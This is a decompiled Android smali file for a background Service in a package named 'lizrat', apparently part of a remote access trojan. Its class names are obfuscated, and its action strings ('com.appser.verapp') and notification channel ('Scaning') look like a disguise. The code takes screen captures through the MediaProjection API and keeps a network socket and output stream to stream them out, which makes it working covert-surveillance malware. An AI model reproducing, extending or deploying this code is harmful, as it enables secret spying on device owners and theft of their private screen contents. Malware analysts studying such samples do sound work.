.class public LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;
.super Landroid/app/Service;
.source "weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22.java"


# static fields
.field static final ACTION_RECORD:Ljava/lang/String; = "com.appser.verapp.RECORD"

.field static final ACTION_SHUTDOWN:Ljava/lang/String; = "com.appser.verapp.SHUTDOWN"

.field private static final CHANNEL_WHATEVER:Ljava/lang/String; = "Scaning"

.field static final EXTRA_RESULT_CODE:Ljava/lang/String; = "resultCode"

.field static final EXTRA_RESULT_INTENT:Ljava/lang/String; = "resultIntent"

.field public static FPS:I = 0x0

.field private static ISON:Z = false

.field private static final NOTIFY_ID:I = 0x26b2

.field public static PID:Ljava/lang/String; = null

.field public static Q:I = 0x0

.field static final VIRT_DISPLAY_FLAGS:I = 0x9

.field private static sk:Ljava/net/Socket;

.field public static syc:Ljava/lang/Object;


# instance fields
.field public Lo:Z

.field public bts:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "[B>;"
        }
    .end annotation
.end field

.field public ctd:Z

.field private handler:Landroid/os/Handler;

.field private final handlerThread:Landroid/os/HandlerThread;

.field private it:LLiz0rd/lizrat/commentibelizexbeltsmtalkingqthemrdowntownfecuadorarichardkinstructorsvsleepingrharbourlampm21;

.field private mgr:Landroid/media/projection/MediaProjectionManager;

.field private out:Ljava/io/OutputStream;

.field private projection:Landroid/media/projection/MediaProjection;

.field private resultCode:I

.field private resultData:Landroid/content/Intent;

.field public usd:Z

.field private vdisplay:Landroid/hardware/display/VirtualDisplay;

.field private wmgr:Landroid/view/WindowManager;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 128
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->syc:Ljava/lang/Object;

    const/4 v0, 0x0

    .line 129
    sput-boolean v0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->ISON:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .line 33
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 50
    new-instance v0, Landroid/os/HandlerThread;

    .line 51
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0xa

    invoke-direct {v0, v1, v2}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;I)V

    iput-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->handlerThread:Landroid/os/HandlerThread;

    .line 127
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->bts:Ljava/util/List;

    const/4 v0, 0x0

    .line 130
    iput-boolean v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->usd:Z

    iput-boolean v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->ctd:Z

    iput-boolean v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->Lo:Z

    return-void
.end method

.method static synthetic access$000()Z
    .locals 1

    .line 33
    sget-boolean v0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->ISON:Z

    return v0
.end method

.method static synthetic access$002(Z)Z
    .locals 0

    .line 33
    sput-boolean p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->ISON:Z

    return p0
.end method

.method static synthetic access$100()Ljava/net/Socket;
    .locals 1

    .line 33
    sget-object v0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->sk:Ljava/net/Socket;

    return-object v0
.end method

.method static synthetic access$102(Ljava/net/Socket;)Ljava/net/Socket;
    .locals 0

    .line 33
    sput-object p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->sk:Ljava/net/Socket;

    return-object p0
.end method

.method static synthetic access$200(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)Ljava/io/OutputStream;
    .locals 0

    .line 33
    iget-object p0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->out:Ljava/io/OutputStream;

    return-object p0
.end method

.method static synthetic access$202(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;Ljava/io/OutputStream;)Ljava/io/OutputStream;
    .locals 0

    .line 33
    iput-object p1, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->out:Ljava/io/OutputStream;

    return-object p1
.end method

.method static synthetic access$300(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)V
    .locals 0

    .line 33
    invoke-direct {p0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->stopCapture()V

    return-void
.end method

.method static synthetic access$400(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)V
    .locals 0

    .line 33
    invoke-direct {p0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->di()V

    return-void
.end method

.method static synthetic access$500(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)V
    .locals 0

    .line 33
    invoke-direct {p0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->startCapture()V

    return-void
.end method

.method static synthetic access$600(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)Landroid/hardware/display/VirtualDisplay;
    .locals 0

    .line 33
    iget-object p0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    return-object p0
.end method

.method private di()V
    .locals 1

    const/4 v0, 0x0

    .line 242
    iput-boolean v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->Lo:Z

    .line 243
    :try_start_0
    sget-object v0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownOutput()V
    :try_end_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 244
    :catch_0
    :try_start_1
    sget-object v0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownInput()V
    :try_end_1
    .catch Ljava/net/SocketException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 245
    :catch_1
    :try_start_2
    sget-object v0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_2
    .catch Ljava/net/SocketException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    .line 246
    :catch_2
    :try_start_3
    sget-object v0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_3
    .catch Ljava/net/SocketException; {:try_start_3 .. :try_end_3} :catch_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_3

    .line 247
    :catch_3
    :try_start_4
    sget-object v0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/net/SocketException; {:try_start_4 .. :try_end_4} :catch_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_4

    goto :goto_0

    :catch_4
    nop

    .line 248
    :goto_0
    iget-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->out:Ljava/io/OutputStream;

    if-eqz v0, :cond_0

    :try_start_5
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_5
    .catch Ljava/net/SocketException; {:try_start_5 .. :try_end_5} :catch_5
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_5

    :catch_5
    const/4 v0, 0x0

    iput-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->out:Ljava/io/OutputStream;

    :cond_0
    return-void
.end method

.method private foregroundify()V
    .locals 2

    .line 340
    new-instance v0, Landroid/content/Intent;

    const-class v1, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "com.appser.verapp.RECORD"

    .line 342
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    .line 344
    invoke-virtual {p0, v0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method

.method private startCapture()V
    .locals 10

    .line 291
    iget-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->mgr:Landroid/media/projection/MediaProjectionManager;

    iget v1, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->resultCode:I

    iget-object v2, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->resultData:Landroid/content/Intent;

    invoke-virtual {v0, v1, v2}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object v0

    iput-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->projection:Landroid/media/projection/MediaProjection;

    .line 292
    new-instance v0, LLiz0rd/lizrat/commentibelizexbeltsmtalkingqthemrdowntownfecuadorarichardkinstructorsvsleepingrharbourlampm21;

    invoke-direct {v0, p0}, LLiz0rd/lizrat/commentibelizexbeltsmtalkingqthemrdowntownfecuadorarichardkinstructorsvsleepingrharbourlampm21;-><init>(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)V

    iput-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->it:LLiz0rd/lizrat/commentibelizexbeltsmtalkingqthemrdowntownfecuadorarichardkinstructorsvsleepingrharbourlampm21;

    .line 294
    new-instance v0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$4;

    invoke-direct {v0, p0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$4;-><init>(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)V

    .line 301
    iget-object v1, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->projection:Landroid/media/projection/MediaProjection;

    iget-object v2, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->it:LLiz0rd/lizrat/commentibelizexbeltsmtalkingqthemrdowntownfecuadorarichardkinstructorsvsleepingrharbourlampm21;

    .line 302
    invoke-virtual {v2}, LLiz0rd/lizrat/commentibelizexbeltsmtalkingqthemrdowntownfecuadorarichardkinstructorsvsleepingrharbourlampm21;->getWidth()I

    move-result v3

    iget-object v2, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->it:LLiz0rd/lizrat/commentibelizexbeltsmtalkingqthemrdowntownfecuadorarichardkinstructorsvsleepingrharbourlampm21;

    invoke-virtual {v2}, LLiz0rd/lizrat/commentibelizexbeltsmtalkingqthemrdowntownfecuadorarichardkinstructorsvsleepingrharbourlampm21;->getHeight()I

    move-result v4

    .line 303
    invoke-virtual {p0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v2

    iget v5, v2, Landroid/util/DisplayMetrics;->densityDpi:I

    iget-object v2, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->it:LLiz0rd/lizrat/commentibelizexbeltsmtalkingqthemrdowntownfecuadorarichardkinstructorsvsleepingrharbourlampm21;

    .line 304
    invoke-virtual {v2}, LLiz0rd/lizrat/commentibelizexbeltsmtalkingqthemrdowntownfecuadorarichardkinstructorsvsleepingrharbourlampm21;->getSurface()Landroid/view/Surface;

    move-result-object v7

    iget-object v9, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->handler:Landroid/os/Handler;

    const-string v2, "andshooter"

    const/16 v6, 0x9

    const/4 v8, 0x0

    .line 301
    invoke-virtual/range {v1 .. v9}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object v1

    iput-object v1, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    .line 305
    iget-object v1, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->projection:Landroid/media/projection/MediaProjection;

    iget-object v2, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->handler:Landroid/os/Handler;

    invoke-virtual {v1, v0, v2}, Landroid/media/projection/MediaProjection;->registerCallback(Landroid/media/projection/MediaProjection$Callback;Landroid/os/Handler;)V

    return-void
.end method

.method private stopCapture()V
    .locals 1

    .line 283
    iget-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->projection:Landroid/media/projection/MediaProjection;

    if-eqz v0, :cond_0

    .line 284
    invoke-virtual {v0}, Landroid/media/projection/MediaProjection;->stop()V

    .line 285
    iget-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    invoke-virtual {v0}, Landroid/hardware/display/VirtualDisplay;->release()V

    const/4 v0, 0x0

    .line 286
    iput-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->projection:Landroid/media/projection/MediaProjection;

    :cond_0
    return-void
.end method


# virtual methods
.method public FindNewIcon()V
    .locals 2

    .line 190
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$2;

    invoke-direct {v1, p0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$2;-><init>(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 238
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method getHandler()Landroid/os/Handler;
    .locals 1

    .line 256
    iget-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->handler:Landroid/os/Handler;

    return-object v0
.end method

.method getWindowManager()Landroid/view/WindowManager;
    .locals 1

    .line 252
    iget-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->wmgr:Landroid/view/WindowManager;

    return-object v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .line 124
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string v0, "Binding not supported."

    invoke-direct {p1, v0}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onCreate()V
    .locals 2

    .line 64
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    const-string v0, "media_projection"

    .line 66
    invoke-virtual {p0, v0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    iput-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->mgr:Landroid/media/projection/MediaProjectionManager;

    const-string v0, "window"

    .line 67
    invoke-virtual {p0, v0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->wmgr:Landroid/view/WindowManager;

    .line 69
    iget-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->handlerThread:Landroid/os/HandlerThread;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    .line 70
    new-instance v0, Landroid/os/Handler;

    iget-object v1, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->handlerThread:Landroid/os/HandlerThread;

    invoke-virtual {v1}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->handler:Landroid/os/Handler;

    return-void
.end method

.method public onDestroy()V
    .locals 0

    .line 116
    invoke-direct {p0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->stopCapture()V

    .line 118
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    .line 78
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    if-nez p2, :cond_0

    const/16 p2, 0x539

    const-string p3, "resultCode"

    .line 79
    invoke-virtual {p1, p3, p2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    iput p2, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->resultCode:I

    const-string p2, "resultIntent"

    .line 80
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object p2

    check-cast p2, Landroid/content/Intent;

    iput-object p2, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->resultData:Landroid/content/Intent;

    const/16 p2, 0xa

    const-string p3, "Q"

    .line 81
    invoke-virtual {p1, p3, p2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    sput p2, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->Q:I

    const/4 p2, 0x5

    const-string p3, "F"

    .line 82
    invoke-virtual {p1, p3, p2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    sput p2, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->FPS:I

    const-string p2, "P"

    .line 83
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sput-object p1, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->PID:Ljava/lang/String;

    .line 84
    invoke-direct {p0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->foregroundify()V

    goto :goto_0

    .line 86
    :cond_0
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    const-string p3, "com.appser.verapp.RECORD"

    invoke-virtual {p3, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_2

    .line 87
    iget-object p1, p0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->resultData:Landroid/content/Intent;

    if-eqz p1, :cond_1

    .line 90
    invoke-virtual {p0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->FindNewIcon()V

    goto :goto_0

    .line 93
    :cond_1
    new-instance p1, Landroid/content/Intent;

    const-class p2, LLiz0rd/lizrat/SCRActivity;

    invoke-direct {p1, p0, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 p2, 0x10000000

    .line 95
    invoke-virtual {p1, p2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 97
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 100
    :cond_2
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    const-string p2, "com.appser.verapp.SHUTDOWN"

    invoke-virtual {p2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_3

    const/4 p1, 0x0

    .line 102
    sput-boolean p1, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->ISON:Z

    .line 103
    invoke-direct {p0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->stopCapture()V

    const/4 p1, 0x1

    .line 104
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->stopForeground(Z)V

    .line 105
    invoke-virtual {p0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;->stopSelf()V

    :cond_3
    :goto_0
    const/4 p1, 0x2

    return p1
.end method

.method public pr()V
    .locals 2

    .line 134
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;

    invoke-direct {v1, p0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$1;-><init>(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 187
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method processImage([B)V
    .locals 1

    .line 260
    new-instance v0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$3;

    invoke-direct {v0, p0, p1}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$3;-><init>(LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;[B)V

    .line 278
    invoke-virtual {v0}, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22$3;->start()V

    return-void
.end method
